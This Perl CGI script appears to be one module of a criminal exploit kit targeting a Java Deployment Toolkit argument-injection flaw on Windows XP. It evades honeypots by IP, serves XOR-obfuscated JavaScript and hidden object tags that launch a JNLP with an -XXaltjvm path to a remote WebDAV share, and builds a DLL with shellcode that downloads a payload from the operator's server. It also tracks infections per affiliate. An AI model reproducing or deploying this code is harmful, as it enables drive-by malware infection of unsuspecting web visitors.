#!/usr/bin/perl

#
# Exploit Java Argument Inject =< java 1.6.20_b02
# Tested on windows XP SP3 + java 1.6.20_b02 (WORKING)
# NOT FUD
#

use CGI;
use DBI;
use Geo::IP;

require "../lib/JsXOR.pm";
require "../lib/Shellcode.pm";
require "../config.pl";


$q = new CGI;

$urlrequest = $q->param('pagee');

#Connect to database
$db_name = 'DBI:mysql:' . $config{MysqlDB};
$dbh = DBI->connect($db_name, $config{MysqlUser}, $config{MysqlPass}) || die "Could not connect to database: $DBI::errstr";

#Check the Request Method
$requestedmethod = $ENV{REQUEST_METHOD};

########### HoneyPot Function to test ################
$theip = $ENV{REMOTE_ADDR};
$referer = $ENV{HTTP_REFERER};

#IP to Country
$gi = Geo::IP->open( '../dep/GeoIP.dat' );
my $country = $gi->country_code_by_addr($theip);

#Convert IP for database
my (@octets,$octet,$ip_number,$number_convert,$ip_address);
$ip_address = $theip;
chomp ($ip_address);
@octets = split(/\./, $ip_address);
$ip_number = 0;
foreach $octet (@octets) {
$ip_number <<= 8;
$ip_number |= $octet;
}

$doubleip = "";
$verifdoubleipch = $dbh->selectrow_array("SELECT os FROM hosts WHERE ip='$ip_number'");
if($verifdoubleipch eq "")
{
  #Insert the system stats and check if the IP already exist
  $sql = "INSERT hosts (ip, browser, browser_version, os, os_flavor, service_pack, os_lang, country, arch, referer, aff) VALUES ('$ip_number', 'HoneyPot', 'HoneyPot', 'HoneyPot', 'HoneyPot', 'HoneyPot', 'HoneyPot', '$country', 'HoneyPot', 'java_arginject.pl', 'HoneyPot')";
  $statement = $dbh->prepare($sql);
  $statement->execute() or $doubleip = 1;
  $doubleip = 1;
}
else
{
  $doubleip = 1;
}

######################################

if($doubleip eq "1")
{

  $checkvalueavs = "";
  #Check if ip equal to HoneyPot in database (not serving the exploit in this case)
  $checkvalueavs = $dbh->selectrow_array("SELECT os FROM hosts WHERE ip='$ip_number'");

if($checkvalueavs eq 'HoneyPot')
{
  #Redirect to bad page (honeypotted)
  print "Status: 301 Moved\nLocation: /nonexist.html\n\n";
}
else
{
#GET REQUEST
if($requestedmethod =~ "GET")
{
  #Send dll (the exe to execute)
  if($urlrequest eq 'dll')
  {
    $theip = $ENV{REMOTE_ADDR}; #get ip

    #Convert IP
    my (@octets,$octet,$ip_number,$number_convert,$ip_address);
    $ip_address = $theip;
    chomp ($ip_address);
    @octets = split(/\./, $ip_address);
    $ip_number = 0;
    foreach $octet (@octets) {
    $ip_number <<= 8;
    $ip_number |= $octet;
    }

    #Get The affiliate id ( probably don't work if proxy is enabled into browser )
    $aff = $dbh->selectrow_array("SELECT aff FROM hosts WHERE ip='$ip_number'");
   
    #build shellcode
    $urlllll = $config{UrlToFolder} . '/loads.pl?aff=' . $aff . '&xplload=java_arginject';
    $prependshell = "\x81\xc4\x54\xf2\xff\xff";
    $shellcode = Shellcode::pdfgetshell($urlllll);
    $stringtoerase = 'PAYLOAD:' . "\x00" x (length($shellcode) - 2);
    $stringtoreplace = $prependshell . $shellcode;
	
    #make dll
    $urltodll = '../dep/template.dll';
    $dataload = "";
    open(FILE,"<$urltodll") || die "file cannot be openned $urltodll\n";
    while(<FILE>)
    {
      $dataload .= $_;
    }
    close(FILE);
    $dataload =~ s/$stringtoerase/$stringtoreplace/;
	
	#send exe binary
	print $q->header(-type=> 'application/octet-stream');
	print "$dataload";
  }
  else
  {
    #define variables
	$my_host = $config{UrlToFolder};
	$my_host =~ s/http:\/\///eg;
	$my_host =~ s/www\.//eg;
	$my_host =~ /(.*?)\//;
	$my_host = $1;
	$sharename = 'xpl';
	$unc = '\\\\\\\\' . $my_host . '\\\\' . $sharename;
	$jnlp = '-J-XXaltjvm=' . $unc . ' -Xnosplash ' . JsXOR::generate_random_string(8 + int(rand 8)) . '.jnlp';
    #$docbase = JsXOR::generate_random_string(8 + int(rand 8));
	$docbase = '/xpl/';
	
	#Send the good webpage (js or not)
	
	if($urlrequest eq 'shtml') #javascript
	{
	  #define vars
	  $var_str = JsXOR::generate_random_string(8 + int(rand 8));
	  $var_obj = JsXOR::generate_random_string(8 + int(rand 8));
	  $var_obj2 = JsXOR::generate_random_string(8 + int(rand 8));
	  $var_obj3 = JsXOR::generate_random_string(8 + int(rand 8));
	  $js_jnlp = 'http: ' . $jnlp;
	  $clsid = 'CAFEEFAC-DEC7-0000-0000-ABCDEFFEDCBA';
          $html1 = '';
	  $html1 = <<EOF;
<html>
<body>Please wait...
<script language="javascript">
EOF

$jscryptjava = <<OFJAVA;
var $var_str = "$js_jnlp";
if (window.navigator.appName == "Microsoft Internet Explorer") {
var $var_obj = document.createElement("OBJECT");
$var_obj.classid = "clsid:$clsid";
$var_obj.launch($var_str);
} else {
try {
var $var_obj2 = document.createElement("OBJECT");
$var_obj2.type = "application/npruntime-scriptable-plugin;deploymenttoolkit";
document.body.appendChild($var_obj2);
$var_obj2.launch($var_str);
} catch (e) {
var $var_obj3 = document.createElement("OBJECT");
$var_obj3.type = "application/java-deployment-toolkit";
document.body.appendChild($var_obj3);
$var_obj3.launch($var_str);
}
}
OFJAVA

$html2 = <<EOFHTM2;
      </script>
      </body>
      </html>
EOFHTM2

$jscryptjava2 = JsXOR::excryptxorjs($jscryptjava);
$html = $html1 . $jscryptjava2 . $html2;
	}
	if($urlrequest eq 'htm')
	{
	  $clsids = 'CAFEEFAC-DEC7-0000-0000-ABCDEFFEDCBA';
	  $html = <<EOF2;
<html>
<body>Please wait...
<object id="$var_obj" classid="clsid:$clsid"
width="0" height="0">
<PARAM name="launchjnlp" value="$jnlp">
<PARAM name="docbase" value="$docbase">
</object>
<embed type="application/x-java-applet"
width="0" height="0"
launchjnlp="$jnlp"
docbase="docbase"
/>
</body>
</html>
EOF2
	}
	if($urlrequest ne 'shtml' and $urlrequest ne 'htm' and $referer ne "")
	{

          #Get The affiliate id ( probably don't work if proxy is enabled into browser )
          $aff = $dbh->selectrow_array("SELECT aff FROM hosts WHERE ip='$ip_number'");

          #Insert the view param on exploit
          $sql = "UPDATE exploits SET java_arginject=java_arginject+1 WHERE affid='$aff'";
          $statement = $dbh->prepare($sql);
          $statement->execute(); #or print "$DBI::errstr";

          #Insert the view param on exploit (admin)
          $sql = "UPDATE exploits SET java_arginject=java_arginject+1 WHERE affid='admin'";
          $statement = $dbh->prepare($sql);
          $statement->execute(); #or print "$DBI::errstr";

	  $js_uri = $config{UrlToFolder} . '/exploits/java_arginject.pl?aff=' . $aff . '&pagee=shtml';
	  $no_js_uri = $config{UrlToFolder} . '/exploits/java_arginject.pl?aff=' . $aff . '&pagee=htm';
	  $html = <<EOF3;
<html>
<head>
<meta http-equiv="refresh" content="0;$no_js_uri" />
</head>
<body>
Please wait...
<script language="javascript">
document.location = "$js_uri";
</script>
</body>
</html>
EOF3
	}
  #send the html
  print $q->header;
  print $html;
  }
  
}

# OPTIONS REQUEST
if($requestedmethod =~ "OPTIONS")
{
 print $q->header(
        -type    => 'text/html',
        -allow => 'OPTIONS, GET , PROPFIND',
        -public  => 'OPTIONS, GET , PROPFIND'
        );
}

# PROPFIND REQUEST
if($requestedmethod =~ "PROPFIND")
{
  $bodyxml = '';
  $urlrequest = $ENV{QUERY_STRING};
  if($urlrequest =~ 'dll') #send dll
  {
    $pathdll = '/xpl/jvm.dll';
    $bodyxml = <<XOF;
<?xml version="1.0" encoding="utf-8"?>
<D:multistatus xmlns:D="DAV:">
<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
<D:href>$pathdll</D:href>
<D:propstat>
<D:prop>
<lp1:resourcetype/>
<lp1:creationdate>2010-02-26T17:07:12Z</lp1:creationdate>
<lp1:getlastmodified>Fri, 26 Feb 2010 17:07:12 GMT</lp1:getlastmodified>
<lp1:getetag>"39e0132-b000-43c6e5f8d2f80"</lp1:getetag>
<lp2:executable>F</lp2:executable>
<D:lockdiscovery/>
<D:getcontenttype>application/octet-stream</D:getcontenttype>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>
</D:multistatus>
XOF
  }
  else
  {
    $pathdll = '/xpl/';
    $bodyxml = <<XOF2;
<?xml version="1.0" encoding="utf-8"?>
<D:multistatus xmlns:D="DAV:">
<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
<D:href>$pathdll</D:href>
<D:propstat>
<D:prop>
<lp1:resourcetype><D:collection/></lp1:resourcetype>
<lp1:creationdate>2010-02-26T17:07:12Z</lp1:creationdate>
<lp1:getlastmodified>Fri, 26 Feb 2010 17:07:12 GMT</lp1:getlastmodified>
<lp1:getetag>"39e0001-1000-4808c3ec95000"</lp1:getetag>
<D:lockdiscovery/>
<D:getcontenttype>httpd/unix-directory</D:getcontenttype>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>
</D:multistatus>
XOF2
  }
  
  # Send the xml
  print $q->header(-type=> 'text/xml', -status=> '207 Multi-Status' );
  print $bodyxml;
}
}
}
else
{
  #Redirect to bad page (honeypotted)
  print "Status: 301 Moved\nLocation: /nonexist.html\n\n";
}


$dbh->disconnect();

1;
